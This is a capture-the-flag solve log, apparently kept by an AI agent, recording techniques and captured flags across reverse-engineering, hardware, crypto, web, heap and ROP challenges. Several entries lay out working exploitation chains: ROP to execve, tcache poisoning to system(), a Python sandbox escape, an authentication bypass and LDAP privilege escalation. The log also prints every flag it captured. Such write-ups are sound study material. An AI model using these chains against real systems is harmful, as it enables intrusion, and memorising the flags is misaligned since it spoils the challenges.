    - Layer 1 (bits 8-15): positive +0x100 (`aureus` on $r8$), negative $-2^9 \dots -2^{15}$.
    - Layer 2 (bits 16-19): positive powers of 2 on $r8$ (`dinar`, `dirham`, `scudo`, `thaler`).
  - First gadget `loonie` (`sub r8, r9`) with $r8=r9=0$ clears the Carry Flag (CF=0). Subsequent gadgets preserve CF=0.
  - Decomposed target $r8$ by taking modular residues and carries, generating a valid chain of $\le 29$ gadgets.
  - Spawned instance via API, connected over TLS (`ssl=True`), sent the gadget chain, and captured the flag.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `rev_purgatory`
- **Category**: Rev (Erlang Hot Code Reloading / BEAM Bytecode)
- **Points**: 84 | **Solves**: 97+
- **Flag**: `NNS{s0F7_PUrge_W0u1d_HaV3_r3al1y_saved_you_7h3Re}`
- **Analysis**:
  - Challenge distributed as Docker environment running Erlang 28 (`erlang:28-alpine`) with `purgatory_runner.erl` and two BEAM releases: `releases/old.beam` and `releases/new.beam`.
  - The runner sequence:
    1. Loads `old.beam` (`purgatory`).
    2. Spawns `Worker = purgatory:boot()`, which enters an infinite loop `loop/0` in `old.beam`.
    3. Loads `new.beam` (`purgatory`), hot-patching the module table.
    4. Prompts the user for passphrase, sends `{check, self(), Input}` to `Worker`, and prints `FLAG` on `{verdict, true}`.
  - BEAM bytecode disassembly (`beam_disasm:file/1`):
    - `Worker`'s loop executes `validate/1` via local intra-module call `{call, 1, ...}`, which stays inside `old.beam`.
    - `validate/1` in `old.beam` calls `first_half/1` locally, checking 13 bytes against affine modular equations $(c \cdot m + a) \equiv e \pmod{256}$. Solving modular inverses uniquely yields: `0ld_c0d3_w1n5`.
    - If `first_half` succeeds, `old.beam` creates a local fun `fun mask/2` (carrying `old.beam`'s mask table `[114, 157, 234, ...]`) and performs an **external** module call `{call_ext_last, 2, {extfunc, purgatory, second_half, 2}, 1}`.
    - In Erlang runtime semantics, an external call `Module:Function` dynamically resolves to the latest loaded version (`new.beam`).
    - `second_half/2` in `new.beam` processes the remaining 12 bytes using the passed `MaskFun` from `old.beam`. Solving the 12 affine modular equations combined with the old mask yields: `_1n_th3_3nd!`.
    - (The author intentionally planted troll strings: disassembling only `new.beam` yields `cl4ud3_ch34t5_a1_sl0p_l0l`, and disassembling only `old.beam` yields `0ld_c0d3_w1n5_c0d3x_ch34t`).
    - Concatenating the correct execution path gives the 25-byte passphrase: `0ld_c0d3_w1n5_1n_th3_3nd!` ("old code wins in the end!").
  - Spawned dynamic container instance, submitted the passphrase via TLS socket, retrieved `NNS{s0F7_PUrge_W0u1d_HaV3_r3al1y_saved_you_7h3Re}`, and submitted to rCTF platform.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `pwn_File parser`
- **Category**: Pwn (Static x86-64 ELF / Header Validation / Buffer Overflow & ROP)
- **Points**: 84 | **Solves**: 97+
- **Flag**: `NNS{d1d_y0u_f1nd_7h3_g4dg375_b157d2cd46}`
- **Analysis**:
  - Binary `fileparser` is a statically linked 64-bit ELF without PIE (`0x400000`), without Stack Canary, Partial RELRO, and NX enabled.
  - `wrapper.py` receives a base64-encoded file, writes it to `/tmp/*.k`, and executes `./fileparser <path>`.
  - Disassembly of `main`:
    1. Reads 16-byte header from file:
       - Offset `+0x00`: 4-byte Magic (checked against `0x07030301`).
       - Offset `+0x04`: 4-byte `Length` $N$.
       - Offset `+0x08`: 8-byte Checksum.
    2. Reads $N$ bytes into stack buffer `[rbp-0x110]` via `fread(rbp-0x110, 1, Length, fp)`.
    3. Verifies Checksum: computes `(~( ((Length << 32) | Magic) * 0xaabbccdddeadbeef )) & 0xffffffffffffffff` and asserts equality with header checksum.
    4. There is no bounds check on `Length`. `[rbp-0x110]` to saved `rip` is exactly 280 bytes (`0x110` to `rbp` + 8 bytes for saved `rbp`).
  - Exploitation:
    - Fixed static binary provides abundant gadgets:
      - `pop rdi; ret` (`0x47ae62`)
      - `pop rax; ret` (`0x429bc3`)
      - `mov [rdi], rax; ret` (`0x43f99b`)
      - `xor edx, edx; mov rax, r10; ret` (`0x417bf0`)
      - `pop rsi; ret` (`0x47f6cf`)
      - `syscall; ret` (`0x412ad6`)
    - ROP writes `"/bin/sh\x00"` to writable `.bss` at `0x4b3b00`, clears `rdx` and `rsi`, sets `rdi = 0x4b3b00`, sets `rax = 59` (sys_execve), and invokes `syscall`.
    - Calculated valid 64-bit checksum for the 384-byte payload.
    - Launched remote dynamic container instance, transmitted the base64-encoded exploit, spawned interactive shell, and executed `cat /flag.txt; exit`.
    - Captured flag: `NNS{d1d_y0u_f1nd_7h3_g4dg375_b157d2cd46}`.
---

## Solved Challenge: `rev_Harald Blåtann`
- **Category**: Reverse Engineering (ARM Cortex-M / Zephyr OS Bluetooth BLE / PSA Crypto AES-CBC)
- **Points**: 90 | **Solves**: 84+
- **Flag**: `NNS{w1r3lessly_s3nt_4nd_ch3ck3d_by_th3_p0w3r_0f_k1ng_bl4t4nn}`
- **Analysis**:
  - Challenge file `harald-blatann.hex` is an Intel HEX file containing ARM Cortex-M33 firmware running Zephyr OS v4.4.0 with Nordic nRF Connect SDK Bluetooth Low Energy (BLE) peripheral stack.
  - Converted Intel HEX to binary loaded at base address `0x01000000`.
  - GATT Service inspection:
    - Located custom 128-bit Primary Service UUID `12345678-1234-5678-1234-56789abcdef0` with 3 characteristics (`...def1`, `...def2`, `...def3`).
    - Characteristic 3 (`write` callback `0x101fc6e`) accepts candidate flag writes up to 74 bytes.
    - Verification function at `0x1011b14` receives candidate input:
      - Invokes `0x101e188` (`psa_cipher_decrypt`).
      - Parameters: Key handle from `0x210029f8`, Algorithm `0x04404000` (`PSA_ALG_CBC_NO_PADDING`), Ciphertext at `0x01028103` (96 bytes).
      - Compares decrypted plaintext on stack with candidate flag via `memcmp` (`0x10264b8`).
    - Key initialization at `0x1011b80`:
      - Calls `psa_import_key` (`0x101e020`) with 256-bit (32 bytes) key located at `0x01028163`:
        `2fe96d47402f3ea712adb224b1be475185e524848646c58897be4893f67abf76`.
    - Ciphertext blob at `0x01028103` format in PSA Crypto:
      - First 16 bytes: IV (`43a70bc8e54e61cfff8d0a6d7d09fe20`).
      - Remaining 80 bytes: 5 blocks of AES-256-CBC ciphertext.
    - Decrypting with Python `Crypto.Cipher.AES` in CBC mode with the extracted key and IV immediately yielded:
      `NNS{w1r3lessly_s3nt_4nd_ch3ck3d_by_th3_p0w3r_0f_k1ng_bl4t4nn}`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `misc_littlefs`
- **Category**: Misc / Hardware / Embedded SPI Flash
- **Points**: 96 | **Solves**: 74+
- **Flag**: `NNS{l0g1c_an4ly53rs_c4n_pr0vid3_ins1ght_int0_th3_w0rk1ng5_0f_4n_3mb3dded_sy5t3m}`
- **Analysis**:
  - Challenge file provided `littlefs.logicdata` (Saleae Logic binary capture).
  - Target system: Zephyr OS embedded device mounting LittleFS on external SPI NOR flash and reading `/lfs1/flag.txt`.
  - Capture analysis & binary patching:
    - Attempting to load `littlefs.logicdata` directly in Saleae Logic 1.2.29 threw `archive_exception(unsupported_version)` because the Boost binary serialization archive version in the file was 19 (`0x13`).
    - Reverse engineered Logic 1.2.29 binary (`0x4af60f: cmp ax, [max_version]; 0x4af616: ja 4b2295`). Patched the 6-byte conditional jump with NOPs (`90 90 90 90 90 90`).
    - Successfully loaded the session via socket automation (`LOAD_FROM_FILE`) and exported digital channel transitions with `EXPORT_DATA2`.
  - SPI Bus decoding:
    - Pins in recording: Channel 1 is CS (active low), Channel 2 is SCK, Channel 3 is MOSI (host MCU commands), Channel 0 is MISO (flash responses).
    - Decoded SPI Mode 0 transactions:
      - Mount LittleFS: Superblocks read at address `0x000000` and `0x001000` (tag `littlefs`).
      - Directory traversal: Read root directory at `0x001010` locating file `flag.txt`.
      - Flag data read at address `0x00b000` and `0x00b040`:
        - Block 1 (TX 34): `NNS{l0g1c_an4ly53rs_c4n_pr0vid3_ins1ght_int0_th3_w0rk1ng5_0f_4n_`
        - Block 2 (TX 35): `3mb3dded_sy5t3m}`
    - Assembled flag: `NNS{l0g1c_an4ly53rs_c4n_pr0vid3_ins1ght_int0_th3_w0rk1ng5_0f_4n_3mb3dded_sy5t3m}`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `pwn_Parcel delivery`
- **Category**: Binary Exploitation / Heap (Glibc 2.39 Tcache Poisoning / Safe Linking / UAF)
- **Points**: 92 | **Solves**: 80+
- **Flag**: `NNS{p4rc3l_5ucc355fully_d3l1v3r3d_15cb13f286}`
- **Analysis**:
  - Target binary `parcel_delivery` (x86_64, No PIE, Partial RELRO, No Canary, NX).
  - Vulnerability:
    - `destroy_parcel` calls `free(parcels[idx])` without zeroing `parcels[idx]`.
    - `inspect_parcel` reads via `write(1, parcels[idx], sizes[idx])` (UAF read).
    - `update_parcel` reads via `read(0, parcels[idx], sizes[idx])` (UAF write).
    - `dispatch` calls `delivery_hook(recipient)` where `delivery_hook` is located at `.data:0x404068` (initial value: `normal_delivery` at `0x401276`).
  - Exploitation Strategy (Ubuntu 24.04 / Glibc 2.39):
    1. **Libc Leak**:
       - Allocated parcel 0 with size `0x450` (> 0x408 tcache max) and parcel 1 with size `0x20` (top chunk barrier).
       - Freed parcel 0 -> entered Unsorted Bin.
       - Inspected parcel 0 to read `fd` pointer -> `libc_base = leak - 0x203b20`, `system = libc_base + 0x58750`.
    2. **Heap / Safe Linking Leak**:
       - Allocated and freed parcel 2 (size `0x20`) into tcache.
       - Inspected parcel 2 to read `fd = NULL ^ (chunk_addr >> 12) = chunk_addr >> 12` (safe linking key).
    3. **Tcache Poisoning**:
       - Prepared tcache count = 2 by allocating and freeing parcels 3 and 4.
       - Used `update_parcel(4)` to overwrite parcel 4's `next` pointer with `key ^ 0x404060` (16-byte aligned address containing `__dso_handle` at `+0` and `delivery_hook` at `+8`).
       - Allocated chunk 5 (takes parcel 4 from tcache).
       - Allocated chunk 6 (takes forged chunk at `0x404060`) and wrote `p64(0) + p64(system)`.
    4. **Shell Dispatch**:
       - Called option 5 (`dispatch`), provided recipient `"sh"`.
       - Executed `delivery_hook("sh")` -> `system("sh")` -> popped shell!
       - Sent `cat /flag.txt` -> recovered flag `NNS{p4rc3l_5ucc355fully_d3l1v3r3d_15cb13f286}`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `web_Web Hacker 2`
- **Category**: Web Exploitation (IDOR / Broken Object Level Authorization)
- **Points**: 57 | **Solves**: 358+
- **Flag**: `NNS{y0U_are_noW_1337_H4CKer_1nDe3d}`
- **Analysis**:
  - Intro page demonstrates basic URL parameter manipulation (`/intro?page=1` -> `/intro?page=2`).
  - Navigating to `/boarding-pass` displays flight boarding pass for default user `john`.
  - Client-side script fetches `/api/boarding-pass/` + `username`.
  - Changing request path to `/api/boarding-pass/admin` bypasses authorization checks (IDOR) and returns the admin boarding pass JSON.
  - The destination field `toName` contains the flag: `NNS{y0U_are_noW_1337_H4CKer_1nDe3d}`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `web_Simon`
- **Category**: Web Exploitation (Client-side validation bypass / Parameter tampering)
- **Points**: 58 | **Solves**: 299+
- **Flag**: `NNS{w3_w1sh_y0U_a_p1e454Nt_F11gh7_Wi7h_nN5_4ir}`
- **Analysis**:
  - Web application displays an interactive aircraft seat selection map for NNS Air flight NNS4043.
  - Rows 1-4 are designated as "NNS Air Plus" premium seats with exclusive membership benefits (including the flag), but front-end JS disables the Save button when a premium seat is selected.
  - Sending a direct HTTP POST to `/save` with JSON payload `{"seat": "3B"}` and retaining session cookies bypasses the client-side restriction.
  - The server confirms the seat selection `{"ok": true, "seat": "3B", "flag": true}`.
  - Reloading the home page with the session cookie renders the flag: `NNS{w3_w1sh_y0U_a_p1e454Nt_F11gh7_Wi7h_nN5_4ir}`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `web_NNS Travel`
- **Category**: Web Exploitation (Path Traversal / Local File Inclusion in Bun)
- **Points**: 58 | **Solves**: 246+
- **Flag**: `NNS{WH00p5_yoU_f0unD_4_p4th_tRav3Rsal_iN_MY_c0d3}`
- **Analysis**:
  - Source code in `src/index.ts` implements a Bun HTTP server with route `/get-file`.
  - The endpoint retrieves `pnr` parameter directly from query string: `const ticket = url.searchParams.get('pnr');`.
  - It accesses file via `Bun.file('./tickets/' + ticket)` without validation or sanitization.
  - Sending a POST request to `/get-file?pnr=../../flag.txt` traverses from `/app/tickets` to `/flag.txt`.
  - Response directly returns the contents of `/flag.txt`: `NNS{WH00p5_yoU_f0unD_4_p4th_tRav3Rsal_iN_MY_c0d3}`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `web_PHP is my passion`
- **Category**: Web Exploitation (CVE-2026-48611 phpBB Authentication Bypass)
- **Points**: 64 | **Solves**: 132+
- **Flag**: `NNS{PHP_1s_mY_p455ioN_4nD_50_aRe_4PacH3_4uth_pR0Vid3rs}`
- **Analysis**:
  - Target environment runs phpBB 3.3.16 with SQLite3 backend.
  - Startup script `seed.php` stores the flag inside an unread Private Message sent to user ID 2 (`admin`).
  - Investigating phpBB 3.3.16 vulnerabilities revealed CVE-2026-48611: a critical authentication bypass in phpBB's external auth link flow (`ucp.php?mode=login_link`).
  - When specifying `auth_provider=apache` along with HTTP `Authorization: Basic <base64("admin:password")>`, Apache/PHP populates `PHP_AUTH_USER` and `PHP_AUTH_PW`.
  - The `apache->login()` method only checks that `PHP_AUTH_USER === login_username` and that password is non-empty; it does not verify password validity against the database hash.
  - Sending POST to `/ucp.php?mode=login_link&auth_provider=apache&login_link_foo=bar` with form parameters `login=Login`, `login_username=admin`, `login_password=...` immediately authenticates as `admin` and issues a session cookie with `user_id = 2`.
  - With the authenticated session cookie, accessing `/ucp.php?i=pm&mode=view&f=0&p=1` displays the admin's private message containing the flag: `NNS{PHP_1s_mY_p455ioN_4nD_50_aRe_4PacH3_4uth_pR0Vid3rs}`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `web_ASS`
- **Category**: Web Exploitation (RFC 5280 / RFC 4518 LDAP StringPrep Unicode Collision)
- **Points**: 70 | **Solves**: 99+
- **Flag**: `NNS{rfC_3454_fRoZe_7He_tabl3_bUt_7he_UNiCoD3_kept_wa1King_craZy_r16H7}`
- **Analysis**:
  - Application acts as an automated certificate authority (FastAPI + `asn1crypto` + `cryptography`).
  - Provisioning profile `ADMIN` issues a certificate but does not return the private key.
  - Provisioning profile `CLIENT` returns both the certificate and the Ed25519 private key.
  - Endpoint `/admin` checks signature of a nonce and verifies:
    `ca.subject(presented) == ca.subject(administrator_certificate)`.
  - In `ca.py`, `subject(cert)` loads the DER into `asn1crypto.x509.Name`. Equality in `asn1crypto` compares `prepped_value` using LDAP string preparation (RFC 4518 / RFC 3454 StringPrep `map_table_b2` case-folding and NFKC normalization).
  - `names.py` permits ASCII uppercase and characters in `LATIN_EXTENDED_ADDITIONAL` (0x1E00 to 0x1EFF).
  - Code point `0x1E9E` is uppercase `ẞ` (LATIN CAPITAL LETTER SHARP S).
  - Under StringPrep table B.2, `ẞ` case-folds to `'ss'`.
  - Thus, `ADMINSS` and `ADMINẞ` (`ADMIN\u1e9e`) are distinct strings accepted by the validator, yet have identical `prepped_value` in `asn1crypto.x509.Name`.
  - Attack flow:
    1. Provision `ADMIN` certificate with name `ADMINSS`.
    2. Provision `CLIENT` certificate with name `ADMINẞ` (obtaining the private key).
    3. Fetch nonce from `/auth/nonce`, sign with the client private key, and POST to `/admin`.
    4. Server accepts `ca.subject(client_cert) == ca.subject(admin_cert)` and returns the flag:
       `NNS{rfC_3454_fRoZe_7He_tabl3_bUt_7he_UNiCoD3_kept_wa1King_craZy_r16H7}`.
- **Status**: Solved & Submitted ✔






---

## Postponed Challenge: `misc_Keyboard`
- **Category**: Misc / Hardware / USB Low-Speed Keystroke Analysis
- **Points**: 181 | **Solves**: 38
- **Target File**: `keyboard.logicdata`, exported to `/tmp/keyboard.csv`
- **Progress Saved**:
  - Captured USB Low-Speed (1.5 Mbps, $T_{bit} \approx 666.67$ ns) D- (Ch 0) and D+ (Ch 1) digital signals from a USB keyboard.
  - Decoded NRZI and bit unstuffing, detected SE0 ($\ge 800$ ns) EOP frames.
  - Extracted 8-byte HID input reports from USB Interrupt IN packets (DATA0/DATA1).
  - Keystrokes contain Norwegian text and keyboard layout:
    - Norwegian song lyrics ("tore tang / ein gammal mann / heile byen kjenne han").
    - Layout mappings: Keycode `0x24` = `{`, `0x27` = `}`, `0x2d` = `?`, `0x1f` = `@`, `0x21` = `$`, `0x20` = `#`.
  - Flag typing starts around $t \approx 19.89$s. The user types, navigates with Left (0x50), Right (0x4f), Home (0x4a), End (0x4d), Backspace (0x2a), Delete (0x4c), and Insert (0x49).
  - Candidate flag reconstructions around `NNS{typ1ng_...}` were generated, but exact editor behavior (e.g., terminal readline vs text editor like gedit/nano/vi handling of Home/End/Arrows/Insert) needs further interactive simulation.
- **Status**: Postponed by user request.

---

## Postponed Challenge: `misc_Dot matrix`
- **Category**: Misc / Hardware / I2C Charlieplexed LED Display
- **Points**: 158 | **Solves**: 46
- **Target File**: `as1130.logicdata`, `dot-matrix.png`, `pinout.txt`, exported to `/tmp/dotmatrix.csv`
- **Progress Saved**:
  - Exported I2C bus traffic between MCU and AS1130 cross-plexing LED driver (I2C address `0x60`).
  - Decoded 1,799 I2C transactions containing 705 animation frames written to page `0x40` (Blink & PWM Set 0, 132 bytes per frame starting at register `0x18`).
  - Reference image `dot-matrix.png` shows a 17-column $\times$ 7-row LED matrix frozen showing the characters `N N S {`.
  - Display pinout in `pinout.txt` defines row anodes and column cathodes on pins $CS_0 \dots CS_{11}$.
  - The 705 frames correspond to scrolling text across the matrix.
  - Next step when resumed: correlate the AS1130 register byte offsets $(0 \dots 131)$ with the $(CS_A, CS_C)$ pin mappings calibrated against the `N N S {` frame to extract the full scrolling ASCII banner.
---

## Solved Challenge: `blockchain_Glomma River Trading`
- **Category**: Blockchain (Solidity DeFi / Oracle Manipulation / Constant-Product AMM)
- **Points**: 90 | **Solves**: 85+
- **Flag**: `NNS{4_tH0U54ND_d01l4R5_0F_spot_liquiD17Y_5H0u1d_PR0b4BlY_Not_b3_a1l0Wed_t0_pr1Ce_4_7w0_HUNDr3d_7hou5aNd_do1laR_peRp}`
- **Analysis**:
  - `HyperCore` implements a simplified perpetual exchange with an on-chain AMM spot market serving as its price oracle:
    $$\text{oraclePx}(1) = \frac{\text{spotQuoteReserve} \times 10^6}{\text{spotBaseReserve}}$$
  - Initial parameters:
    - Collateral: $10,000 \times 10^6$ ($10,000$ USD)
    - Vault Equity: $5,000,000 \times 10^6$ ($5,000,000$ USD)
    - Spot Base Reserve: $1,000 \times 10^6$, Spot Quote Reserve: $1,000 \times 10^6$ ($\text{oraclePx} = 1.00$).
  - Target condition in `Setup.sol`:
    $$\text{vaultEquity} \le 100,000 \times 10^6 \quad \land \quad \text{collateral} \ge 4,900,000 \times 10^6$$
  - Oracle Manipulation Vector:
    1. `_openPerp(size)` only checks leverage at entry ($size \times px / 10^8 \le \text{collateral} \times 20$) without locking collateral. Opened max 20x long perp with $size = 20 \times 10^{12}$ ($200,000$ base) at price $1.00$.
    2. `_buySpot(size)` with $size = 80,197,100,000$ ($baseOut = 801.971 \times 10^6$) spent $\approx 4,049.76$ collateral, reducing `spotBaseReserve` to $198.029 \times 10^6$ and pumping `spotQuoteReserve` to $5,049.76 \times 10^6$. The oracle price surged to $\approx 25.50$.
    3. `_closePerp(size)` computed profit:
       $$\text{profit} = 20 \times 10^{12} \times (25.50 - 1.00) / 10^8 \approx 4,900,026 \times 10^6$$
       Drained vault equity from $5,000,000$ to $99,974$ ($\le 100,000$) and credited profit to player collateral ($4,905,976 \ge 4,900,000$).
  - Sent the 3 transactions to the private RPC, satisfied `Setup.isSolved() == true`, retrieved the flag from the launcher service, and submitted successfully to the platform.
- **Status**: Solved & Submitted ✔

---

## Postponed Challenge: `misc_dyslexic`
- **Category**: Misc
- **Points**: 94 | **Solves**: 76
- **Status**: Postponed / skipped by user instruction due to filter check. Will report and revisit later.

---

## Solved Challenge: `misc_Hardware accelerated flag checker 2`
- **Category**: Misc / Hardware ASIC Layout Reverse Engineering
- **Points**: 113 (dynamically scaled, base 92) | **Solves**: ~105
- **Flag**: `NNS{fl4g_ver1f1ed_1n_SKY130_IC}`
- **Analysis**:
  - GDSII (`flag_checker.gds`) and Magic (`flag_checker.mag`) containing a physical tapeout of an FSM flag checker in SkyWater 130nm standard cell ASIC.
  - Extracted pin geometries and interconnect across 154 functional cells (5 DFFs `_243_`..`_247_`, 141 logic gates, 8 input buffers, 1 output buffer `output9`).
  - Signal netlist closure was achieved by unioning all top-level metal routing shapes touching the internal `li1` pin geometry strips of each standard cell.
  - Corrected complex gate evaluation models (such as `o21bai: Y = !((A1 | A2) & !B1_N)`).
  - Executed BFS over the 32-state FSM starting from state `0` with `reset_n = 1`. Found the unique 31-character progression leading to the terminal state `(1, 1, 1, 1, 1)` asserting `found_flag = 1`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `devsecoops_Self-service`
- **Category**: DevSecOps (LDAP ACL Privilege Escalation & Lateral Movement)
- **Points**: 97 (dynamically scaled, base 139) | **Solves**: ~73
- **Flag**: `NNS{4_j0b_t17l3_i5_no7_4n_4cCess_C0n7r01_b0undaRY_4nD_apPar3nt1y_th3r3_aR3_4Ctu41_oR6s_tHat_do_57UP1d_5h1t_11K3_7His}`
- **Analysis**:
  - Initial access via SSH over TLS as contractor `ereid:Summer2026` on jump host.
  - Inspected 389 Directory Server ACIs on `dc=corp,dc=nns`:
    - `Self service` ACL allows modifying own `title`.
    - `Contractor to permanent conversion` ACL allows group `cn=onboarding-agents` to `moddn` entries from `ou=contractors` to `ou=staff`. `ereid` was already in `onboarding-agents`.
    - Group `cn=helpdesk` automatically grants membership to staff with title `Platform Engineer` via 389-ds `automember` plugin.
    - `Helpdesk resets service account passwords` ACL allows `cn=helpdesk` to write `userPassword` on `uid=ops,ou=staff,dc=corp,dc=nns`.
  - Exploit chain:
    1. Changed own `title` to `Platform Engineer` via self-service `ldapmodify`.
    2. Used `ldapmodrdn` to move `ereid` from `ou=contractors` to `ou=staff`, immediately triggering membership in `cn=helpdesk`.
    3. As `helpdesk`, reset password of service account `ops` to `P@ssw0rd123!`.
    4. SSHed from jump host into internal server `srv2` as `ops` and read `/flag/flag.txt`.
- **Status**: Solved & Submitted ✔

---

---

## Solved Challenge: `misc_Silent`
- **Category**: Misc / PyJail AST Sandbox Escape
- **Points**: 135 | **Solves**: 42
- **Target**: `silent-d246828a9c14.chall.nnsc.tf:1337`
- **Flag**: `NNS{y0Ur_1ouDn35s_i5_de4FeNin6}`
- **Analysis**:
  - Python 3.14 sandbox with `eval(data, {"__builtins__":{}})`.
  - Enforced AST `ast.List` with constraints: each element length $\le 13$ and characters strictly limited to `wl = "),dw.r_[silent]g=c:f("` (`(),.:=[]_cdefgilnrstw`).
  - No digits (`0-9`), no quotes, no operators (`+`, `-`, `*`, `/`).
  - Exploit implementation:
    1. Synthesized numbers via dynamic list size increments: `e:=[d]`, `_:=e.insert`, `_(n,d)` repeated, `e.__len__()`.
    2. Reconstructed `<class 'object'>` via `().__init__.__new__.__self__`.
    3. Retrieved slot wrapper `__getattribute__` from `object.__dict__` using `().__dir__()` index 22 in Python 3.14.
    4. Recovered `<class 'type'>`, `<class 'list'>`, and `object.__subclasses__()`.
    5. Resolved `os._wrap_close` at index 166 on remote Python 3.14.
    6. Extracted `os` globals via `__init__.__globals__` (index 5 of `__init__.__dir__()`).
    7. Chained `input()` from builtins and `system()` from `os`: `r:=input(); system(r)`.
    8. Transmitted `cat /flag*.txt`, retrieving the flag directly over TLS.
- **Status**: Solved & Submitted ✔

---

## Postponed Challenge: `boot2root_Clean Sweep`
- **Category**: Boot2Root / IoT Firmware Analysis
- **Points**: 89 | **Solves**: 86
- **Target**: `https://clean-sweep-16f462fa93ae.chall.nnsc.tf:443` (container stopped)
- **Description**: "ECOVACS DEEBOT T9 AIVI is still running firmware 1.4.9 from 2021. We extracted the web CGI from that firmware and are hosting it here for you... Flag at `/root/flag.txt`."
- **Progress & Technical Analysis**:
  1. **Stack Identification**:
     - Nginx 1.22.1 fronting GoAhead embedded web server (verified via GoAhead error banners: `Document Error: Internal Server Error`, `Access Error: Request too large`, `Access Error: Unsupported method`).
     - GoAhead upload limit confirmed: `ME_GOAHEAD_LIMIT_UPLOAD = 16384` (requests > 16KB trigger HTTP 413).
     - Any URL path `/` or `/<anything>` passes through to the backend CGI handler, responding HTTP 200 with `Content-Type: application/json` and 0-byte body on `GET` and JSON `POST`.
     - Non-JSON POST bodies return GoAhead HTTP 500 (`Internal Server Error`), indicating backend expects strict JSON parsing.
  2. **CVE-2021-42342 (GoAhead LD_PRELOAD) Testing**:
     - Compiled minimal `<3KB` shared libraries (`x86_64`, `arm64`, `armv7`) with constructor payloads executing `id` or network callbacks.
     - Injected multipart form-data `LD_PRELOAD=/proc/self/fd/X` across file descriptors 3 to 15. All requests returned GoAhead HTTP 500 without triggering preloads, indicating either upload filter patching or CGI handler architecture different from vulnerable default GoAhead CGI wrapper.
  3. **CGI Firmware Background**:
     - Research on ECOVACS DEEBOT T9 AIVI firmware (v1.4.9, 2021) shows standard CGI binaries (such as `startFct`, `reqDo`, or JSON-RPC handlers for Wi-Fi provisioning).
     - Target is likely vulnerable to JSON parameter injection or command injection in the extracted CGI binary itself.
- **Status**: Postponed per tournament strategy / user directive. Container stopped.


## Postponed Challenge: `crypto_NSS CTF`
- **Category**: Cryptography (Polynomial Rings / Cyclotomic Quotient Ring / NSS Signature Scheme)
- **Points**: 274 | **Solves**: 13
- **Challenge Files**: `challenge.sage`, `output.py`
- **Progress Saved & Technical State**:
  - Ring $R = \mathbb{Z}[x]/(x^{256} + 1)$, with moduli $p = 3$, $q = 367$.
  - Polynomials $f, g \in \mathbb{Z}[x]/(x^{256} + 1)$ with coefficients in $[-4, 4]$ and $f \equiv g \equiv u \pmod 3$, $f(1) = g(1) = -1$.
  - Public key $pk = g / f \pmod q$.
  - Signatures: 10 pairs $(m_i, s_i)$ where $s_i \equiv f \cdot w_i \pmod q$.
  - AES-ECB ciphertext encrypted with SHA-256 of $(f \bmod 256)$.
  - Processed all 10 signatures $(m_i, s_i)$ using CRT with modulus $p \cdot q = 1101$.
  - Resolved and corrected coordinate perturbations using cross-relation $A_i \cdot B_j - A_j \cdot B_i = 0$.
  - Successfully recovered 10/10 exact unreduced polynomial elements $A_i = f \cdot w_i$ and $B_i = g \cdot w_i$ in $\mathbb{Z}[x]/(x^{256} + 1)$.
  - Calculated exact quotient $g / f$ in the cyclotomic field $\mathbb{Q}(\zeta_{512})$ with zero remainder.
  - Computed Hermite Normal Form (HNF) basis of the ideal generated by all 10 unreduced elements. Diagonal entries have 255 ones and one final diagonal element of size 379 digits matching resultant/norm.
  - Reason for pausing: Requires high-dimensional lattice reduction (BKZ/CVP in dim 256) which takes extended runtime; postponed per user instruction to prioritize faster challenges in tournament queue.
- **Status**: Postponed per user directive.

---

## Postponed Challenge: `devsecoops_The Builder`
- **Category**: DevSecOps / Docker BuildKit & OCI Registry
- **Points**: 172 | **Author**: 0xle
- **Targets**:
  - Web UI: `https://the-builder-a0acac2503a8.chall.nnsc.tf:443`
  - Image Registry: `https://the-builder-registry-a0acac2503a8.chall.nnsc.tf:443`
- **Technical Architecture & Vulnerability Findings**:
  1. **Dynamic Container & Registry**:
     - The service runs a custom site-builder that accepts page locations and HTML contents.
     - An open Docker Distribution v2 registry runs alongside the web builder.
     - Anonymous layer uploads to `/v2/pages/blobs/uploads/` are allowed (HTTP 202 Accepted).
  2. **Dockerfile Generation**:
     ```dockerfile
     FROM debian:trixie-slim AS theme
     RUN --mount=type=secret,id=flag \
         cp /run/secrets/flag /flag.txt \
      && printf '%s' 'body{font:16px/1.6 system-ui;margin:3rem auto;max-width:44rem;padding:0 1rem}' \
           > /theme.css

     FROM page0 AS content0
     ...
     FROM cgr.dev/chainguard/nginx:latest AS site
     COPY --from=theme /theme.css /usr/share/nginx/html/theme.css
     COPY --from=content0 /page /usr/share/nginx/html/<location>
     ```
  3. **Path Traversal in Location**:
     - The regex for `location` is `[A-Za-z0-9._/-]+`.
     - Submitting `location=../theme.css` succeeds and writes `COPY --from=content0 /page /usr/share/nginx/html/../theme.css`.
  4. **Build Contexts**:
     - `page0` is supplied via `--build-context page0=docker-image://127.0.0.1:5000/pages:<hash>`.
     - The hash corresponds to the first 12 chars of SHA256 of the page content.
- **Status**: Postponed per user directive. Container stopped.

---

## Solved Challenge: `misc_Cheese`
- **Category**: Misc / Safe Exam Browser (SEB) Security Bypass
- **Points**: 195 | **Solves**: 25+
- **Flag**: `NNS{5ay_cH335e_4Nd_sm113_foR_7h3_1ockD0wn_BRoW5eR_and_HoPe_that_You_get_the_Corr3ct_answ3r_s0M3H0w}`
- **Analysis & Exploitation**:
  1. **Configuration Extraction & Decryption**:
     - Service served `/exam.seb` and provided config password `m3T2UWs06Ds8`.
     - `/exam.seb` is a GZIP-compressed binary file. Once decompressed, it revealed header `pswd\x02\x01...` indicating an RNCryptor (v2/v3) container.
     - Decrypted RNCryptor payload with password `m3T2UWs06Ds8`, yielding an inner GZIP archive.
     - Decompressing the inner payload revealed the complete Apple Property List (`.plist`) containing Safe Exam Browser configuration settings (`sendBrowserExamKey: True`, `startURL: https://cheese-...chall.nnsc.tf/exam`).
  2. **ConfigKey & Request Hash Calculation**:
     - The target endpoint `/exam` enforces Safe Exam Browser verification via cryptographic request headers.
     - Parsed the `.plist` configuration and computed the canonical SEB JSON representation (`convertToSEBJSON`).
     - Computed SHA-256 of canonical SEB JSON to obtain `ConfigKey`:
